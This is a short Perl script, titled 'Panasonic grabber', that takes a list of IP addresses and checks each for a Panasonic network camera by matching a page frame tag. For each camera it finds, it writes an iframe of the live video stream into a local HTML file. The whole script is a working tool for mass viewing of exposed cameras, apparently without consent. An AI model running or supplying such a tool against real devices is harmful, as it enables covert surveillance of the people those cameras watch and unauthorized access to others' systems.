#!/usr/bin/perl
# Tested on Panasonic BB-HCM581 / BB-HCM735 / BL-C160

use LWP::UserAgent;

system $^O eq 'MSWin32' ? 'cls' : 'clear';

print "\t\n       Panasonic grabber\n\n\n";


open(op,"<$ARGV[0]") or die "$!";
while(<op>){
chomp($ips = $_);

my $ua = LWP::UserAgent->new();

$ua->agent("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

my $req = $ua->get("http://".$ips."/")->content;

if($req =~/<FRAME name=hrbar src=\"BarFoot.html\" scrolling=no NORESIZE>/) {


print " [".$ips."] => Panasonic Detected \n";

open(pana, ">>panasonic.html");
print pana "<h1>".$ips."<\/h1><br><br><iframe src=\"http:\/\/".$ips."\/nphMotionJpeg?Resolution=640x480&Quality=Standard\" width=\"640\" height=\"480\"><\/iframe><br><br>";
close pana;


}
}
